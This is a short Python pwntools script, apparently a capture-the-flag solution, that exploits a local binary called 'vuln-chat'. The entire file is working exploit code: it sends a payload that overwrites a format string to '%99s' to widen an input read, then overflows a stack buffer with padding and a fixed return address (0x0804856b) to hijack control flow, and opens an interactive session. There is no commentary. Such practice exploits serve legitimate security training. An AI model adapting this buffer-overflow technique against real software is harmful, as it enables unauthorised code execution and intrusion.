#!/usr/bin/python3
import pwn
binary = "vuln-chat"
pwn.context.binary = binary
pwn.context.encoding = "latin"

padding_overwrite = 20
payload_overwrite = b"A" * padding_overwrite + b"%99s\n"

padding_overflow = 49 
payload_overflow = b"A" * padding_overflow + pwn.p32(0x0804856b)

payload = payload_overwrite + payload_overflow

with pwn.process(binary) as io:
    io.send(payload)
    pwn.info(io.readrepeat(1))
    io.interactive()